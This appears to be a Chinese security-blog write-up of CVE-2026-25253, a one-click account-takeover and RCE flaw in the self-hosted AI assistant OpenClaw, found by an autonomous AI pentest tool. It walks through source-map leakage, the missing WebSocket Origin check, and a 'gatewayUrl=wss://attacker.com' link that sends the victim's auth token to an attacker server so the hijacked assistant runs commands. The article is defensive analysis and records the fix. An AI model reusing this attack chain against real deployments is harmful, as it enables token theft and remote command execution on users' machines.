---
title: 黑掉你龙虾（OpenClaw）的竟然是另一个AI？一键RCE漏洞浅析
url: https://mp.weixin.qq.com/s/e1S1lU1uRBrNvimioDuC-Q
source: Doonsec's feed
date: 2026-03-13
fetch_date: 2026-03-14T04:08:25.316205
---

# 黑掉你龙虾（OpenClaw）的竟然是另一个AI？一键RCE漏洞浅析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/37Pkb7GDdah1FAs4YKLOloe78SU6yM9exYOzd1J5WxicROmGLvd78guCmv1dxQyzDkicSia4qEIGtVkAhSVPKsOyVDXqLeMibJBes7pOgxk26Kc/0?wx_fmt=jpeg)

# 黑掉你龙虾（OpenClaw）的竟然是另一个AI？一键RCE漏洞浅析

冰皇
冰皇

DigDog安全团队

![]()

在小说阅读器中沉浸阅读

# 黑掉你龙虾（OpenClaw）的竟然是另一个AI？一键RCE漏洞浅析

![](https://mmbiz.qpic.cn/sz_mmbiz_png/37Pkb7GDdajkxS1jatMIs6icHLcpPuic2iaSAWz8rAIe08lxGzzkyZ9BEMjegOjqVHYGf159tueiaGKjjBLOhlNxssUfumyhnicrmSibfs362P5GM/640?wx_fmt=png&from=appmsg)

当人们谈论 AI 安全威胁时，往往想到的是模型幻觉、提示注入，或是训练数据污染。但有一个问题鲜少被认真讨论：**一个 AI 系统，能否主动攻击并入侵另一个 AI 系统？**

本文记录的，正是这样一次真实发生的攻击实验。

---

## 背景：OpenClaw 是什么？

OpenClaw（前身为 Moltbot/Clawdbot）是一款**开源、可自托管的 AI 控制平面（Control Plane）**。它允许用户通过 Telegram、微信等多种消息应用统一接入，形成一个"始终在线的个人 AI 助手"，并在用户自己的设备上执行各类任务。

在这场热潮的背后，隐含着极大的风险！助手具备**完整系统访问权限（Full System Access）**——因此它成为了一个极具吸引力的攻击目标。

![](https://mmbiz.qpic.cn/mmbiz_png/37Pkb7GDdaia4ickr6U1ygpSTOdMylEcEAibh4IYCSdDpKaE41RYB0RJKJJMEiaFUZseicoEL8icuyOjxIVMOXMkr7D2ksSdibjywVOKszohoCkiaL4/640?wx_fmt=png&from=appmsg)

### 问题的苗头

* 海量用户将 OpenClaw 实例部署在公网服务器，**端口开放，默认配置从未修改**；
* Gateway 控制台面板（Control UI）意外作为公开仪表盘暴露在互联网上；
* 该项目在 X/Twitter 社区被广泛讨论，受众多为非安全专业背景的 AI 爱好者。

这三点叠加，构成了攻击的温床。

---

## 角色介绍：Hackian vs. OpenClaw

```
⚔  攻击方：Hackian（Ethiack 开发的自主 AI 渗透测试工具）
🎯 目标：OpenClaw（开源自托管 AI 控制平面）
```

| 角色 | 特征 |
| --- | --- |
| **Hackian** | 自主侦察 → 构造 PoC → 验证 → 报告，全程无人工干预 |
| **OpenClaw** | 多平台消息接入，助手具备完整系统访问权限，Gateway 控制 UI 默认启用 |
| **Verifier** | Hackian 发现漏洞后，由独立验证模块确认真实可利用性，避免误报 |

本次评估完全以**黑盒（Black-box）** 方式进行——即 Hackian 在没有任何 OpenClaw 内部知识的前提下，仅凭公开接口发起测试。

---

## 第一步：侦察阶段（Recon）

Hackian 的侦察流程分为四个阶段，每一步都在为最终的漏洞利用铺路：

### 1. 扫描端点

Hackian 首先对目标暴露的服务和接口进行全面扫描，识别所有可访问的 HTTP/WS 端点，建立初步的攻击面地图。

### 2. Source Map 泄露

在扫描过程中，Hackian 发现目标服务器意外暴露了 **JavaScript Source Map 文件**（`.map` 文件）。

Source Map 本是开发调试工具，用于将压缩混淆后的 JS 代码映射回原始源码。但当它被意外部署到生产环境时，攻击者可以**完整还原前端源代码**，无需任何逆向工程。这意味着：

* 所有前端路由、组件逻辑一览无余；
* 状态管理（Vuex/Redux Store）和认证流程清晰可见；
* 硬编码的 API 端点、配置参数一目了然。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/37Pkb7GDdahpH6oRdCWOzT79oYHM77OH6ZB5d2jUwRZdqfBrJwD2pgu3VYtrM4O2ibSpfmiaiaN4nicsdHVnIAwBrWibAbLZnHYZ2XNuKVjwicNE0/640?wx_fmt=png&from=appmsg)

### 3. WebSocket 分析

获得源码后，Hackian 开始深度分析 WebSocket 通信逻辑。关键发现：**OpenClaw 的 WebSocket 网关对连接来源（Origin）不做任何验证**，任意域名均可发起升级请求。

### 4. 定位关键函数

在还原的源码中，Hackian 精准定位到 `buildToolStreamMessage` 函数——这正是向 AI 助手下达指令的核心函数，也是整条利用链的终点。

### 侦察小结

| 发现项 | 安全影响 |
| --- | --- |
| Source Map 泄露 | 攻击者可还原完整前端源代码，无需逆向 |
| 跨域 WebSocket 升级 | 任意来源均可发起 WebSocket 连接 |
| 客户端安全验证逻辑 | 安全机制依赖前端，可被轻易绕过 |

> **Hackian 结论**："目标已提供了会话劫持和未授权执行所需的全部原语。"

---

## 第二步：漏洞发现——`gatewayUrl` 参数覆盖 + Token 泄露

这是整个漏洞链的核心。

### 漏洞本质

OpenClaw 的 Gateway 控制面板（默认启用）接受 URL 查询参数 `gatewayUrl`，用于覆盖 WebSocket 网关的连接地址。**此参数没有任何鉴权保护。**

换句话说，任何人只要构造一个包含 `?gatewayUrl=wss://attacker.com` 的链接，就可以让访问者的 OpenClaw 实例悄悄连接到攻击者控制的服务器。

### 账户接管（ATO）攻击流程

```
攻击者构造含恶意 gatewayUrl 的链接
         ↓
受害者访问攻击者页面，触发重定向到：
  https://victim-openclaw.com?gatewayUrl=wss://attacker.com
         ↓
OpenClaw 前端自动连接攻击者的 WebSocket 服务器
         ↓
LocalStorage 中存储的 Auth Token 即刻外泄
         ↓
攻击者获得合法 Token → 完成账户接管（ATO）
```

> ⚠️ **仅需受害者点击一次链接。**

**漏洞类型：**

* CSRF（跨站请求伪造）
* 敏感数据泄露（Auth Token）
* WebSocket Origin 验证缺失

---

## 第三步：从 ATO 到 RCE——本地部署也不安全

账户接管只是开始。更危险的是：**即便 OpenClaw 仅部署在本地（localhost），同样无法幸免。**

### 为什么本地部署也会中招？

这里涉及三个关键的技术事实：

1. **WebSocket 没有 CORS 等效的跨域限制机制。** HTTP 请求有同源策略（Same-Origin Policy）和 CORS 保护，但 WebSocket 升级握手不受同等约束。
2. **OpenClaw 网关未对连接来源（Origin Header）进行验证。** 服务端没有检查 `Origin` 字段，导致任意来源的连接都被接受。
3. **Chrome 144 默认未启用「本地网络访问」权限提示（Private Network Access）。** 浏览器没有拦截外部页面访问 `localhost` 的 WebSocket 连接。

这三点叠加的结果：**受害者的浏览器成为攻击者的跳板，代替攻击者访问 localhost 上的 OpenClaw 实例。**

### 完整 RCE 利用链

| 阶段 | 操作者 | 行为 |
| --- | --- | --- |
| 1 | 攻击者 | 搭建 WebSocket 服务器，监听并保存 Token |
| 2 | 受害者浏览器 | 访问恶意页面 → 重定向至含恶意 `gatewayUrl` 的控制台 |
| 3 | 攻击者服务器 | 接收并存储 Gateway Auth Token |
| 4 | 攻击者（借助浏览器） | 用 Token 建立合法 WS 会话，连接 localhost 网关 |
| 5 | AI 助手 | 执行攻击者指令 → 系统命令运行 → 结果回传 |

利用链的终点，是 OpenClaw 的 AI 助手——它拥有完整的系统访问权限，帮助攻击者在受害者机器上执行任意操作系统命令，并将结果回传。**这就是 RCE（远程命令执行）**。

---

## 攻击与响应时间线

整个过程的速度令人震惊：

```
1月26日 21:21  →  渗透测试启动
                  Hackian 对 OpenClaw 实例发起黑盒渗透测试

1月26日 23:05  →  漏洞确认（⏱ 仅用 1小时40分钟）
                  Hackian 发现漏洞，Verifier 独立验证成功 ✓

1月27日 02:02  →  漏洞上报
                  漏洞报告提交至 OpenClaw 维护团队

1月28日 01:12  →  PR 提交
                  Ethiack 按要求提交修复 Pull Request

1月29日 05:32  →  正式修复（从上报到修复：不足3天）
                  修复合并进主分支，补丁发布 🎉
```

* **发现漏洞耗时：1 小时 40 分钟**
* **从上报到修复：不足 3 天**
* **漏洞利用难度：1-Click（一次点击）**

---

## 漏洞总结

本次漏洞涉及三个独立的安全问题，单独看每一个都并不罕见，但叠加起来，效果是灾难性的：

### 1. URL 参数注入 / CSRF

* `gatewayUrl` 可被外部任意覆盖
* GET 请求直接影响数据完整性
* 无任何鉴权保护

### 2. WebSocket Origin 验证缺失

* 无跨域保护机制
* 任意来源可建立连接
* 受害者浏览器成为攻击跳板

### 3. Source Map 泄露

* 前端完整源码对外可见
* 大幅降低漏洞分析成本
* 暴露核心业务逻辑细节

### 修复措施（commit `8cb0fa9`）

受影响版本：**≤ 2026.1.29**

| 问题 | 修复方案 |
| --- | --- |
| `gatewayUrl` 参数覆盖 | 移除或严格限制该参数的覆盖能力 |
| WebSocket 跨域问题 | 服务端实施严格 Origin 验证 |
| Source Map 泄露 | 生产环境禁止暴露 `.map` 文件 |

---

## 深层启示

### 技术层面

* **AI 助手的「全系统访问权限」是双刃剑**。它让 AI 更强大，也让攻击者的战利品更丰厚。一旦 AI 助手被控制，攻击者得到的不是一个受限 Shell，而是一个拥有完整操作权限的自动化代理。
* **自托管工具的安全门槛远超普通用户认知**。把一个具备系统访问权限的 AI 助手暴露在公网，需要专业的安全加固，而这往往超出了普通 AI 爱好者的能力范围。
* **WebSocket 是新兴、缺乏规范的攻击面**。与 HTTP 相比，开发者对 WebSocket 安全的理解和警惕普遍不足，缺乏成熟的防护框架。

### AI 安全层面

* **AI 可以自动化攻击另一个 AI 系统**。Hackian 在没有任何人工干预的情况下，在 100 分钟内完成了从侦察到漏洞确认的全流程。这不再是科幻，而是现实。
* **传统安全工具的响应速度已经落后**。当 AI 攻击工具可以在两小时内发现并验证漏洞，依赖人工进行定期安全审计的模式已经过时。

### 行业警示

* **AI 构建得越快，AI 测试就应该越频繁。** 快速迭代不能以牺牲安全为代价。
* **速度不是忽视安全的借口。** 这次漏洞从发现到修复不足三天，说明修复本身并不难——难的是在发布前就把问题找出来。
* **漏洞不分好人坏人，AI 也是。**

> *"AI is here for everyone, not just the good guys."*— Ethiack Security Research

---

## 数据

| 指标 | 数值 |
| --- | --- |
| 漏洞发现耗时 | **1 小时 40 分钟** |
| 利用难度 | **1-Click（一次点击）** |
| 从上报到修复 | **不足 3 天** |
| CVE 编号 | **CVE-2026-25253** |

---

## 结语

这次漏洞研究的价值，不仅仅在于发现并修复了一个具体的安全问题。它揭示了一个更深层的趋势：

**当 AI 构建的速度超过安全检测的速度，漏洞就会大规模扩散。**

OpenClaw 的维护团队在收到报告后不足三天便完成了修复，这值得称赞。但更重要的是，整个 AI 工具生态——尤其是那些具备系统访问权限的自托管助手——都需要从第一天起就将安全性纳入设计考量。

在 AI 时代，安全不再是一个可以"之后再说"的问题。

---

**参考资料**

* 原始研究报告：ethiack.com/news/blog/one-click-rce-openclaw
* CVE 详情：CVE-2026-25253
* 修复 Commit：`8cb0fa9`
* OpenClaw 项目：github.com/openclaw

- END -

预览时标签不可点

内容含AI生成图片

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/gpJicBFkNzcumue4RsgwDWyMwXPERWB8DfAXkRicibD9Z5pcicRMBpeWHvpSAV2e1QH5WKAEtic2Bcpkvryhk0T8WeA/0?wx_fmt=png)

DigDog安全团队

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/gpJicBFkNzcumue4RsgwDWyMwXPERWB8DfAXkRicibD9Z5pcicRMBpeWHvpSAV2e1QH5WKAEtic2Bcpkvryhk0T8WeA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过